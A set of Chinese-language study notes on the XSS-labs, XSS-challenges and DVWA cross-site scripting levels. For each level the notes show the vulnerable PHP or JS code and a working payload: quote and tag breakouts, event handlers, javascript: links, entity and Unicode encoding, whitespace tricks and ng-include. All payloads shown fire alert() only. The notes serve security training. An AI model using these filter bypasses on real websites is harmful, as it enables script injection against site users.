#### Less-1

输入参数为name直接回显，查看源代码，直接在前端代码，为反射性XSS

直接name=<script>alert('xss')</script>

##### 修复

 ``` js
 $str = htmlspecialchars($_GET["name"] , ENT_QUOTES);
 ```

#### Less-2

输入参数，查看源码，内容被传递给服务器上的php文件，处理后又将参数keyword插入到<h2>标签之中以及添加到input的value中

 ```js
 #输入test
 <h2 align=center>没有找到和test相关的结果.</h2><center>
 <input name=keyword value="test">
 ```

h2标签的内容被html编码，因此value处闭合即可

####  Less-3

同L2，但是两处都使用了html编码

```js
 htmlspecialchars($_GET["name"] , ENT_QUOTES);
```

但是此处没有设置第二参数，导致编码会转换双引号，不转换单引号

因此使用单引号闭合即可

#### Less-4

过滤了<>

但是使用on事件即可

#### Less-5

过滤on和<script>

因此使用a标签

```js
"><a href="javascript:alert(/xss/)">alert</a> <"
```

#### Less-6

大小写绕过

#### Less-7

双写绕过

#### Less-8

编码绕过

编码后仍然会被解析

```js
javascript:alert(/xss/)
->
&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x2f;&#x78;&#x73;&#x73;&#x2f;&#x29;
#HTML encode
```

#### Less-9

后端检测

``` js
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}

```

因此需要拼接http://

同时发现过滤了JavaScript，因此需要编码

``` js
#javascript:alert('xss''http://')
&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;'http://'&#x29;
```

#### Less-10

隐藏表单

``` js
<input name="t_link" value="" type="hidden">
<input name="t_history" value="" type="hidden">
<input name="t_sort" value="" type="hidden">
```

构造payload

``` js
?keyword=test&t_link=test&t_history&t_sort=test
```

发现只有t_sort标签有回显

因此构造payload

``` js
?keyword=test&t_sort=" onclick=alert(/xss/) type="text" ><
```

#### Less-11

隐藏表单

```js
<input name="t_ref"  value="" type="hidden">
```

t_ref的参数值是http请求包中的referer

#### Less-12

隐藏表单

```js
<input name="t_ua"  value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 
```

t_ua参数值是uer-agent

#### Less-13

cookie传入隐藏表单标签

```js
<input name="t_cook"  value="" type="hidden">
```

#### Less-14

EXIF

**可交换图像文件格式**（英语：Exchangeable image file format，官方简称**Exif**），是专门为[数码相机](https://zh.wikipedia.org/wiki/数码相机)的照片设定的，可以记录数码照片的属性信息和拍摄数据。可使用鼠标右键进入属性页面查看部分信息。

windows通过右键属性可以修改属性，插入XSS语句

网站/插件读取exif信息时，就会触发payload

#### Less-15

参数上传后插入span标签的ng-include后面

同时参数上传后会被过滤

```js
$str = $_GET["src"];
echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';
```

#### Angular JS

- ngular JS的很多参数都是以“ng”开头的，例如ng-app、ng-model、ng-bind等等。
- 在这里，ng-include指令用于包含外部的HTML文件，包含的内容将作为指定元素的子节点。`ng-include` 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。其作用原理非常类似于文件包含，比如ng-include'level1.php'

构造payload：

```js
'level1.php?name=<img src=123 οnerrοr=alert(1)>'
```

先被html编码，然后传到level1.php中被解码，然后触发XSS

#### Less-16

```js
level16.php?keyword=<><script>script scripScrIPtt " ' \
输出：
<center><><&nbsp;>&nbsp;&nbsp;scrip&nbsp;t&nbsp;"&nbsp;'&nbsp;\</center>
```

过滤script和\但是没有过滤尖括号

因此使用img标签

```js
<img asrc=x onerror=alert(1)>
```

发现也过滤空格

##### 空格绕过

- %0a 换行
- %0d 回车

```js
<img%0asrc=x%0aonerror=alert(1)>
```

#### Less-17

标签在<embed>属性中，该标签支持一些事件属性

payload:

```js
?arg01=a&arg02=b οnmοuseοver=alert(1)
```

#### Less-18

同17

#### Less-19，20

flashxss



### XSS-challenges

#### stage3

国家参数通过下拉菜单选择

可以burp抓包从而实现自定义

#### stage5

前端maxlength长度限制，可以修改

#### stage8

什么是javascript伪协议？下面的代码：

```js
<a href=javascript:alert('XSS')
```

这道题目的源码

```php
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
```

stryolower 全部转换成小写

str_replace过滤了<script和on

因此闭合双引号和标签，然后使用伪协议

paylaod

```js
"><a href=javascript:alert('XSS') //
```

#### stage10

domain被过滤

双写/base64编码绕过

#### stage11

过滤script

绕过：插入不可见字符/unicode编码

```js
"><a href="javas&#09cript:alert(document.domain);">xss</a>"><a
```

#### stage12

IE浏览器，两个反引号可以闭合双引号

#### stage15

过滤<>

##### 绕过方式1：16进制绕过

<是3c，要让js能识别就要在前面加上\x，变成\x3c

##### 绕过方式2：unicode编码绕过

<变成3c，前面加上\u00，js可以识别，变成\u003c

## **XSS**

### 1.反射型XSS

#### **low**

没有任何措施 直接<script>触发即可

#### **medium**

过滤了<script>直接嵌套，大小写，或者使用其他on事件 

#### **high**

```js
$name=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i','',$_GET['name']);
```

正则规则完善了，不能使用大小写，点匹配任意字符，*表示0次以上

#### impossible

```js
$name=htmlspecialchars($_GET['name']);
```

经过了html实体化，并且放在<pre>标签中，无法绕过

### **2.DOM XSS**

#### **low**

```php
varlang=document.location.href.substring(document.location.href.indexOf("default=")+8);  
document.write("<option value='"+ lang + "'>" + $decodeURI(lang) + "</option>");  
```

lang变量通过document.location.href获取，输出在option标签中

因此直接payload

```php
?default=English <script>alert('XSS')</script>`  
```

#### **medium**

 ```js
 # Do not allow script  tags      
 if  (stripos ($default, "<script") !== false) {        
     header ("location:  ?default=English");     
     exit;    
 }  
 ```

通过strpos()函数查找<script字符串在default变量中第一次出现的位置

如果查找到那么替换location后面的参数为?default=English

相当于过滤了<script>

利用input事件弹窗即可 paylaod1：

```js
?default=English<input onclick=alert('XSS') />  
```

也可以闭合标签使用<img>闭合 payload2：

```js
?default=English<input onclick=alert('XSS') />  
```



#### **high**

```php
<?php     
// Is there any input?  
if ( array_key_exists( "default",  $_GET ) && !is_null ($_GET[ 'default' ]) ) {        
    # White list the allowable languages      
    switch ($_GET['default']) {       
        case "French":        
        case "English":       
        case "German":       
        case "Spanish":        
            # ok        
            break;        
        default:        
            header ("location: ?default=English");          
            exit;    
    }  
}     
?>  
```



使用白名单对default传参进行了过滤

可以自定义另一个变量bypass

payload1：

 ```js 
 ?default=English&a=</option></select><img src=x onerror=alert('XSS')>  
 ?default=English&a=<input  onclick=alert('XSS')/> 
 ```

也可以使用#

##### #锚点

- [www.example.com/index.html#location1](http://www.example.com/index.html)代表着这个网页的location1位置，会将网页滚到location1位置
- 发送http请求的时候会忽略#

因此构造payload2：

```js
?default=English#</option></select><img src=x onerror=alert('XSS')>  
?default=English#<input onclick=alert('XSS')/>  
```

#### impossible

不进行urldecode 所以自然失效

### 3.存储型XSS

#### **low**

没有过滤，两个参数xss

##### medium

```php
//source code  
<?php     
    
if( isset( $_POST[ 'btnSign' ] ) ) {      
    // Get input      
    $message = trim( $_POST[ 'mtxMessage' ] );      
    $name  = trim( $_POST[ 'txtName' ] );         
    // Sanitize message input      
    $message = strip_tags( addslashes( $message ) );      
    $message = ((isset($GLOBALS["___mysqli_ston"]) &&
is_object($GLOBALS["___mysqli_ston"])) ? 
mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message ) : 
((trigger_error("[MySQLConverterToo]  Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));      
    $message = htmlspecialchars( $message );         
    
    // Sanitize name input      
    $name = str_replace( '<script>', '', $name );      
    $name = ((isset($GLOBALS["___mysqli_ston"]) && 
is_object($GLOBALS["___mysqli_ston"])) ? 
mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name ) : 
((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string()  call! This code does not work.", E_USER_ERROR)) ? "" : ""));         
    // Update database      
    $query = "INSERT INTO guestbook ( comment, name ) VALUES (  '$message', '$name' );";      
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );         
    //mysql_close();  
}     
?>  
```

message深度过滤，但是name只过滤了<script>，简单的过滤双写大小写就可以绕过了

同时named的前端input标签输入文本框限制了长度 检查元素调大就可以了

此处可以学习一些过滤的常见函数

payload

```js
Name:<img src=x onerror=alert('XSS')>  Message:whatever  
```

#### high

#### 同medium，但是采取更严格的正则匹配，但是采用其他事件触发即可**

payload:

```js
Name:<img src=x onerror=alert('XSS')>  Message:whatever  
```

#### 



 

 